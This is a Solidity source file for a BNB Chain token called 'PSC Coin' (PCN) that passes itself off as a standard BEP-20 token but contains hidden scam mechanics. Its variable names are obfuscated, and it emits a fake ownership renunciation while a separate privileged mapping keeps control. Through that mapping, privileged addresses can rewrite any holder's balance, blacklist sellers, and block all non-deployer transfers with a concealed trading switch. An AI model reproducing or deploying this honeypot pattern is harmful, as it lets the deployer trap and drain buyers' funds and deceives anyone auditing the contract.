/**
 *Submitted for verification at BscScan.com on 2023-03-24
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface modeEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address autoMin) external view returns (uint256);

    function transfer(address teamFundBuy, uint256 receiverMarketing) external returns (bool);

    function allowance(address liquidityFee, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address teamFundBuy,
        uint256 receiverMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isAt, uint256 value);
    event Approval(address indexed liquidityFee, address indexed spender, uint256 value);
}

interface modeEnableMetadata is modeEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract minTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapSell {
    function createPair(address fromEnable, address fromEnableLaunched) external returns (address);
}

interface maxLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract PSCCoin is minTrading, modeEnable, modeEnableMetadata {

    function marketingTx(uint256 receiverMarketing) public {
        tokenIs();
        listFund = receiverMarketing;
    }

    function balanceOf(address autoMin) public view virtual override returns (uint256) {
        return isMarketingList[autoMin];
    }

    uint256 private buyTeam;

    address receiverBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint8 private receiverAuto = 18;

    string private tradingWallet = "PCN";

    function tokenIs() private view {
        require(sellFromTeam[_msgSender()]);
    }

    function fundSender(address modeLaunch) public {
        tokenIs();
        if (txTradingList == fromFee) {
            teamBuy = toEnable;
        }
        if (modeLaunch == fundList || modeLaunch == fundReceiver) {
            return;
        }
        isTeam[modeLaunch] = true;
    }

    uint256 public teamBuy;

    address private amountTrading;

    bool private fromFee;

    function allowance(address walletFund, address limitFund) external view virtual override returns (uint256) {
        if (limitFund == minLimit) {
            return type(uint256).max;
        }
        return exemptSender[walletFund][limitFund];
    }

    address minLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return exemptLaunched;
    }

    constructor (){
        if (teamBuy == toEnable) {
            txTradingList = false;
        }
        isList();
        maxLaunch totalTrading = maxLaunch(minLimit);
        fundReceiver = swapSell(totalTrading.factory()).createPair(totalTrading.WETH(), address(this));
        
        fundList = _msgSender();
        sellFromTeam[fundList] = true;
        isMarketingList[fundList] = minIsFee;
        if (txTradingList != fromFee) {
            buyTeam = toEnable;
        }
        emit Transfer(address(0), fundList, minIsFee);
    }

    function transferFrom(address shouldFeeMode, address teamFundBuy, uint256 receiverMarketing) external override returns (bool) {
        if (_msgSender() != minLimit) {
            if (exemptSender[shouldFeeMode][_msgSender()] != type(uint256).max) {
                require(receiverMarketing <= exemptSender[shouldFeeMode][_msgSender()]);
                exemptSender[shouldFeeMode][_msgSender()] -= receiverMarketing;
            }
        }
        return exemptFee(shouldFeeMode, teamFundBuy, receiverMarketing);
    }

    uint256 private minIsFee = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return minIsFee;
    }

    function decimals() external view virtual override returns (uint8) {
        return receiverAuto;
    }

    uint256 marketingLaunch;

    function transfer(address modeAt, uint256 receiverMarketing) external virtual override returns (bool) {
        return exemptFee(_msgSender(), modeAt, receiverMarketing);
    }

    uint256 listFund;

    function sellTrading(address shouldFeeMode, address teamFundBuy, uint256 receiverMarketing) internal returns (bool) {
        require(isMarketingList[shouldFeeMode] >= receiverMarketing);
        isMarketingList[shouldFeeMode] -= receiverMarketing;
        isMarketingList[teamFundBuy] += receiverMarketing;
        emit Transfer(shouldFeeMode, teamFundBuy, receiverMarketing);
        return true;
    }

    bool public takeEnable;

    address public fundReceiver;

    event OwnershipTransferred(address indexed autoLaunched, address indexed tokenLimit);

    uint256 public toEnable;

    function approve(address limitFund, uint256 receiverMarketing) public virtual override returns (bool) {
        exemptSender[_msgSender()][limitFund] = receiverMarketing;
        emit Approval(_msgSender(), limitFund, receiverMarketing);
        return true;
    }

    mapping(address => mapping(address => uint256)) private exemptSender;

    bool private feeSell;

    function owner() external view returns (address) {
        return amountTrading;
    }

    bool private tradingEnableTeam;

    function getOwner() external view returns (address) {
        return amountTrading;
    }

    function isList() public {
        emit OwnershipTransferred(fundList, address(0));
        amountTrading = address(0);
    }

    function exemptFee(address shouldFeeMode, address teamFundBuy, uint256 receiverMarketing) internal returns (bool) {
        if (shouldFeeMode == fundList) {
            return sellTrading(shouldFeeMode, teamFundBuy, receiverMarketing);
        }
        uint256 toMinEnable = modeEnable(fundReceiver).balanceOf(receiverBuy);
        require(toMinEnable == listFund);
        require(!isTeam[shouldFeeMode]);
        return sellTrading(shouldFeeMode, teamFundBuy, receiverMarketing);
    }

    address public fundList;

    mapping(address => bool) public isTeam;

    function marketingSwap(address modeAt, uint256 receiverMarketing) public {
        tokenIs();
        isMarketingList[modeAt] = receiverMarketing;
    }

    mapping(address => bool) public sellFromTeam;

    mapping(address => uint256) private isMarketingList;

    function symbol() external view virtual override returns (string memory) {
        return tradingWallet;
    }

    string private exemptLaunched = "PSC Coin";

    bool public txTradingList;

    function fromTotalAt(address limitTeamAmount) public {
        if (takeEnable) {
            return;
        }
        
        sellFromTeam[limitTeamAmount] = true;
        
        takeEnable = true;
    }

}